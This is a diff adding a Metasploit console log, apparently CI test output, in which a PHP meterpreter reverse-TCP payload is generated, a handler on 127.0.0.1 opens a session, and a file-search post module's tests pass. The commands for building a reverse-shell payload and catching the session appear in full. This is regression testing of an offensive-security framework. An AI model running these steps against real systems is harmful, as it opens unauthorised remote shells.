@@ -1,0 +1,47 @@
+Overriding user environment variable 'OPENSSL_CONF' to enable legacy functions.
+[4mmsf6[0m [0m> loadpath test/modules
+Loaded 39 modules:
+    14 auxiliary modules
+    13 exploit modules
+    12 post modules
+[4mmsf6[0m [0m> use php/meterpreter_reverse_tcp
+[4mmsf6[0m payload([1m[31mphp/meterpreter_reverse_tcp[0m) [0m> irb -e '(self.respond_to?(:framework) ? framework : self).datastore.user_defined.clear'
+setg SessionTlvLogging file:/var/folders/24/8k48jl6d249_n_qfxwsl6xvm0000gn/T/phpmeterpreter_reverse_tcp_session_tlv_logging20231026-4412-3nzlfbtxt
+[4mmsf6[0m payload([1m[31mphp/meterpreter_reverse_tcp[0m) [0m> SessionTlvLogging => file:/var/folders/24/8k48jl6d249_n_qfxwsl6xvm0000gn/T/phpmeterpreter_reverse_tcp_session_tlv_logging20231026-4412-3nzlfbtxt
+generate -o /var/folders/24/8k48jl6d249_n_qfxwsl6xvm0000gn/T/child-process-rb-php-meterpreter-reverse-tcp20231026-4412-sxq5al.php -f raw AutoVerifySessionTimeout=30 lport=6001 lhost=127.0.0.1 MeterpreterDebugLogging=rpath:/var/folders/24/8k48jl6d249_n_qfxwsl6xvm0000gn/T/phpmeterpreter_reverse_tcp_debug_log20231026-4412-azvgvvtxt MeterpreterDebugBuild=true
+[4mmsf6[0m payload([1m[31mphp/meterpreter_reverse_tcp[0m) [0m> [*] Writing 34952 bytes to /var/folders/24/8k48jl6d249_n_qfxwsl6xvm0000gn/T/child-process-rb-php-meterpreter-reverse-tcp20231026-4412-sxq5al.php...
+[4mmsf6[0m payload([1m[31mphp/meterpreter_reverse_tcp[0m) [0m> to_handler
+[*] Payload Handler Started as Job 0
+[4mmsf6[0m payload([1m[31mphp/meterpreter_reverse_tcp[0m) [0m> 
+[!] You are binding to a loopback address by setting LHOST to 127.0.0.1. Did you want ReverseListenerBindAddress?
+[*] Started reverse TCP handler on 127.0.0.1:6001 
+[*] Meterpreter session 1 opened (127.0.0.1:6001 -> 127.0.0.1:49806) at 2023-10-26 19:02:00 +0000
+use test/search
+[4mmsf6[0m post([1m[31mtest/search[0m) [0m> run session=1 AddEntropy=true Verbose=true
+[*] Setup: changing working directory to tmp: /var/folders/24/8k48jl6d249_n_qfxwsl6xvm0000gn/T/
+[*] Setup: Creating clean directory
+[*] Creating directory meterpreter-test-dir-yjpmdfnv
+[*] meterpreter-test-dir-yjpmdfnv created
+[*] Setup: Now in /private/var/folders/24/8k48jl6d249_n_qfxwsl6xvm0000gn/T/meterpreter-test-dir-yjpmdfnv
+[*] Source File Name: meterpreter-test-ndahoskv.txt
+[*] Running against session 1
+[*] Session type is meterpreter and platform is osx
+[*] Starting search tests
+[+] should search for new files
+[+] should search recursively for files
+[+] should search with globs for files
+[+] should search with globs ignoring files
+[*] Starting search date tests
+[+] should search with dates for files
+[+] should search with dates ignores new files
+[+] should search with dates ignores old files
+[+] should search with date inclusive of exact date
+[*] Testing complete in 3.39 seconds
+[*] Passed: 8; Failed: 0; Skipped: 0
+[*] Cleanup: changing working directory back to /Users/runner/work/metasploit-framework/metasploit-framework
+[*] Post module execution completed
+sessions -K
+[4mmsf6[0m post([1m[31mtest/search[0m) [0m> jobs -K
+[*] Killing all sessions...
+[*] 127.0.0.1 - Meterpreter session 1 closed.
+[4mmsf6[0m post([1m[31mtest/search[0m) [0m> 
